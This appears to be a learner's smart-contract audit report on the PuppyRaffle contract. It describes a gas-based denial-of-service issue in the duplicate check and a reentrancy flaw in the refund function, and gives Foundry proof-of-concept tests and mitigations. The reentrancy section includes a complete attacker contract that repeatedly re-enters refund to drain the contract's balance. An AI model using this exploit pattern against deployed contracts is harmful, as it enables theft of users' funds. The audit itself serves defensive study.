### [M-#] Looping Through Array For Checking Duplicates Leads To DOS Attack, Which Causes Rise In Gas For Later Participants. 

**Description:** At `PuffyRaffle:enterRaffle` checks for duplicates of players address.
```javascript
@>      // Check for duplicates
        // @audit DOS
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

``` 
As the `PuffyRaffle:players` array gets largers the cost of gas will be raised as more iterration will be done on reading state varibale s `players` array. This leads to that participants who enter first will pay less gas than who enters later this will create discouraegment amount the users to use the protocol and there will be rush to use the protocol first

**Impact:**  The more players enter the more gas price rises. Which Creates Discouragement Amount The User. And Will Create A Rush To Join The Protocol.

**Proof of Concept:**
Check Out The Test Function of `PuffyRaffleTest.t.sol:: testDosAttack`.

<details>
<summary>
    POC
</summary>

```javascript
        function testDosAttack() public{
        vm.txGasPrice(1);

        uint256 playersNumbers = 100;

        address [] memory players = new address[](playersNumbers);

        // Dummy first array of 100
        for(uint256 i =0; i< playersNumbers; i++){
            players[i] = address(i);

        }

       uint256 gasStart1 = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNumbers}(players);

        uint256 gasEnd1 = gasleft();
        
        // gas used For First 100 plyaers enetrance 
        uint256 gasUsed1 = gasStart1 - gasEnd1;


        address [] memory players2 = new address[](playersNumbers);

        for(uint256 i =0; i< playersNumbers; i++){
            players2[i] = address(i+playersNumbers);

        }

        uint256 gasStart2 = gasleft();

        puppyRaffle.enterRaffle{value: entranceFee * playersNumbers}(players2);

        uint256 gasEnd2 = gasleft();

        // gas used For Second 100 plyaers enetrance 
        uint256 gasUsed2 = gasStart2 - gasEnd2;
        console.log("Gas Used For First 100 Players enterance", gasUsed1);
        console.log("Gas Used For Second 100 Players enterance", gasUsed2);


        assert(gasUsed2> gasUsed1);

    }

```

</details>

run the test 
```
forge test --match-test testDosAttack
```

**Recommended Mitigation:** There Are Few Recommended Mitigations.
1. Consider Adding Duplicate Address. As user Can Create Multiple Address From Wallet Add them To The Array Which Also   Will be Diffrent Addres Address But Created By Same User.
2. Use Players Id Which Provide Every single A id And It Maps To A Mapping And Check that Mapping.



### [H-1] Upadting State Variable After Low Level Call Leads To ReentracyAttack ,Means All The Fund Can Be Stealed.

**Description:** The `PuppyRaffle::refund` function updates state variable `PuppfyRaffle::players` array sendeing sending value to the caller.

```javascript
@>  payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
```

Which leads to `ReenteracyAttack`. Through this attack an attacker cann again again `PuppyRaffle::refund` function untill the contract balance reaches to zero which is impacts massive loss. 

**Impact:** The Funds Stored On Contract Are Not Secure. Can Be Taken By A Single Entity. 

**Proof of Concept:**
The May Create Contract With The Initialiazation of Victim i.e(`PuppyRaffle`) Contract. And Set Up A Fallback Or Receive Function As Low Level Call Fall Into These Two Fnction We Can Again Call The Targeted Function Of The Victim i.e(`PuppyRaffle`) Contract  Again Again Until The Attacker Conditon Meets (Notes : If A Contract Call A Low Level Fucntion Call Of A Another Contract The Low Level Call First Return Back to the Contract That Has Called The Low Level Call)

Below The Code DemosTration The Full Scecenrio

<details>
<summary>
Attacker Contract
</summary>

```javascript
contract ReentraceyAttackOnPuppyRaffle {

    PuppyRaffle puppyRafle;

    uint256 attackerIndex;

    uint256 enteranceFee;

    constructor(address _puppyRaffle, uint256 _entranceFee){
        puppyRafle = PuppyRaffle(_puppyRaffle);
        enteranceFee = _entranceFee;
    }

    function atttack() external payable{
        address[] memory attackers = new address[](1);
        attackers[0] = address(this);
        puppyRafle.enterRaffle{value:enteranceFee}(attackers);

        attackerIndex = puppyRafle.getActivePlayerIndex(address(this));

        puppyRafle.refund(attackerIndex);
    }

    function _steal() internal {
        if(address(puppyRafle).balance >= enteranceFee){
            puppyRafle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _steal();
    }

    receive() external payable {
        _steal();
    }
}


```
</details>
You can the Below Test On Foundry

```
forge test --match-test testreentractyAttckTest

```
<details>
<summary>
Test Case Code 
</summary>

```javascript
    function testreentractyAttckTest() public{
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        uint256 startingPuffyRaffleBalance = address(puppyRaffle).balance;

        address attacker = makeAddr("attacker");

        vm.deal(attacker, 2 ether);

        ReentraceyAttackOnPuppyRaffle  reeentraceAttacker = new ReentraceyAttackOnPuppyRaffle(address(puppyRaffle),entranceFee);

        uint256 startingAttackerContractBalance = address(reeentraceAttacker).balance;

        // attakce

        vm.prank(attacker);
        reeentraceAttacker.atttack{value:entranceFee}();

        uint256 endingBalanceOfAttackerContract = address(reeentraceAttacker).balance;
        uint256 endingBalanceOfpuppyContract = address(puppyRaffle).balance;

        console.log("Attacker Balance Before Attack", startingAttackerContractBalance);

        console.log("Puupyy Balance Before Attack", startingPuffyRaffleBalance);

        console.log("Ending Blance Of Attaker Contarct",endingBalanceOfAttackerContract);
        console.log("Ending Blance Of Puppy Contarct",endingBalanceOfpuppyContract);

        assert(address(puppyRaffle).balance==0);

    }
```
</details>



**Recommended Mitigation:** There Are Recommended Few Mitigation On This Specific Atack Vector You Choose As Per Requiements

1. Update State Variable Before Low Level Call.
```diff
+   players[playerIndex] = address(0);
    payable(msg.sender).sendValue(entranceFee);  
```
```diff
    payable(msg.sender).sendValue(entranceFee);
-   players[playerIndex] = address(0);
```

2. Or Use A nonReentrant Modifier From Openzeppelin.

<details>
    <summary>
        Refactored refund Function With The Modifier
    </summary>

```javascript
    function refund(uint256 playerIndex) nonReentrant public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        payable(msg.sender).sendValue(entranceFee);

        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
```
</details>

Find More About `ReentrancyGuard` From  <a href = "https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard">Openzeppelin</a>





### [S-#] TITLE (Root Cause + Impact)

**Description:** 

**Impact:** 

**Proof of Concept:**

**Recommended Mitigation:** 